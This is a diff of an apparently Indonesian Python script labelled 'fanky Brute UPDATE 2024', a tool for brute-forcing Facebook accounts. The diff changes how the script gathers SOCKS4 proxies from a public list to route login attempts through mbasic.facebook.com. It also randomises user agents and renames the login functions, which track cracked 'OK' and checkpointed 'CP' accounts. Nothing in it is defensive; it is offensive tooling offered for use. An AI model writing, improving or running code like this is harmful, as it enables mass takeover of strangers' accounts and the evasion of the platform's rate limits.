@@ -131,130 +131,19 @@ id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = (
 )
 sys.stdout.write("\x1b]2; BMBF | fanky Brute UPDATE 2024\x07")
 # ------------------[ MENCARI-PROXY ]-------------------#
-from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn
-import requests
-import os
-import json
-from datetime import datetime, timedelta
-from requests.exceptions import RequestException
-
-CACHE_FILE = ".prox_cache.json"  # File untuk menyimpan cache proxy
-console = Console()
-
-def clear():
-    """Membersihkan layar konsol."""
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def load_cache():
-    """Memuat cache dari file."""
-    if os.path.exists(CACHE_FILE):
-        with open(CACHE_FILE, "r") as file:
-            return json.load(file)
-    return {}
-
-def save_cache(cache):
-    """Menyimpan cache ke file."""
-    with open(CACHE_FILE, "w") as file:
-        json.dump(cache, file, indent=4)
-
-def is_valid_proxy(proxy):
-    """Fungsi untuk memeriksa apakah proxy valid."""
-    try:
-        test_url = "http://mbasic.facebook.com"
-        proxies = {
-            "http": f"socks4://{proxy}",
-            "https": f"socks4://{proxy}",
-        }
-        response = requests.get(test_url, proxies=proxies, timeout=10)
-        return response.status_code == 200
-    except RequestException:
-        return False
-
 try:
-    clear()
-    # Memuat cache
-    cache = load_cache()
-    console.print(f"[blue]Memuat cache proxy...[/blue]")
-
-    current_time = datetime.now()
-    valid_proxies = [proxy for proxy in cache if cache[proxy].get("last_validated")]
-
-    # Cek apakah sudah ada cukup proxy valid dan apakah sudah 3 hari
-    if len(valid_proxies) >= 10:
-        # Periksa apakah proxy valid sudah lebih dari 3 hari
-        should_refresh = False
-        for proxy in valid_proxies:
-            last_validated = datetime.fromisoformat(cache[proxy]["last_validated"])
-            if current_time - last_validated >= timedelta(days=3):
-                should_refresh = True
-                break
-
-        if not should_refresh:
-            console.print(f"[cyan]Sudah ada 10 proxy valid di cache, dan masih valid. Tidak perlu mencari lagi.[/cyan]")
-        else:
-            console.print(f"[yellow]Beberapa proxy sudah lebih dari 3 hari, memulai pencarian proxy baru...[/yellow]")
-            os.remove(".prox_cache.json")
-    else:
-        console.print(f"[blue]Mengambil daftar proxy...[/blue]")
-        prox = requests.get(
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
-        ).text.splitlines()
-        console.print(f"[green]Berhasil mengambil {len(prox)} proxy[/green]. Memulai validasi... ")
-        console.print(f"[green]Hanya mengambil 10 Prox yang valid aja mohon sabar...\n")
-        
-        max_valid = 10  # Batas maksimal proxy valid yang diambil
-        invalid_count = 0
-
-        # Progress bar setup
-        with Progress(
-            TextColumn("[progress.description]{task.description}"),
-            BarColumn(),
-            TextColumn("{task.completed}/{task.total}"),
-            TextColumn("[green]Valid:[/] {task.fields[valid]}"),
-            TextColumn("[red]Invalid:[/] {task.fields[invalid]}"),
-        ) as progress:
-            task = progress.add_task(
-                "[yellow]Memvalidasi proxy[/]", total=len(prox), valid=0, invalid=0
-            )
-
-            for index, proxy in enumerate(prox, start=1):
-                if len(valid_proxies) >= max_valid:
-                    console.print(f"\n[cyan]Sudah mendapatkan {max_valid} proxy valid. Proses dihentikan.[/cyan]")
-                    break
-
-                # Periksa apakah proxy ada di cache dan valid lebih dari 3 hari
-                if proxy in cache:
-                    last_validated = datetime.fromisoformat(cache[proxy]["last_validated"])
-                    if current_time - last_validated < timedelta(days=3):
-                        valid_proxies.append(proxy)
-                        progress.update(task, advance=1, valid=len(valid_proxies))
-                        continue
-
-                # Validasi proxy baru
-                if is_valid_proxy(proxy):
-                    valid_proxies.append(proxy)
-                    cache[proxy] = {"last_validated": current_time.isoformat()}
-                    progress.update(task, advance=1, valid=len(valid_proxies))
-                else:
-                    invalid_count += 1
-                    progress.update(task, advance=1, invalid=invalid_count)
-                    if proxy in cache:
-                        del cache[proxy]
-
-        # Simpan proxy valid ke file dan update cache
-        with open(".prox.txt", "w") as file:
-            file.write("\n".join(valid_proxies))
-        save_cache(cache)
-
-        console.print(f"\n[green]Proxy valid berhasil disimpan ke .prox.txt[/green]")
-        console.print(f"[cyan]Jumlah proxy valid yang disimpan: {len(valid_proxies)}[/cyan]")
-
-except RequestException as e:
-    console.print(f"[red]Terjadi kesalahan dalam koneksi: {e}[/red]")
+    prox = requests.get(
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
+    ).text
+    open(".prox.txt", "w").write(prox)
 except Exception as e:
-    console.print(f"[red]Kesalahan tak terduga: {e}[/red]")
+    Console().print(
+        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
+    )
+    exit()
 prox = open(".prox.txt", "r").read().splitlines()
+
+
 # ------------[ UBAH UA DIH SINI OM ]-----------#
 for xd in range(1000):
 	rr = random.randint; rc = random.choice
@@ -1683,10 +1572,10 @@ def metcepat():
 
 
 
-def mbasiccc(idf, pwv):
+def mbasic(idf, pwv):
     global loop, ok, cp
     ua = random.choice(baru)
-    #ua2 = random.choice(ugen)
+    ua2 = random.choice(ugen)
     ses = requests.Session()
     prog.update(des, description=f"[[bold green]Mbasic NEW 🗿[bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
     prog.advance(des)
@@ -1875,7 +1764,7 @@ def validatev2(idf,pwv):
 
 
 #--------------------[ METODE ASYNC ]-----------------#
-def mbasic(idf,pwv):
+def mbasiccc(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ua = random.choice(baru)
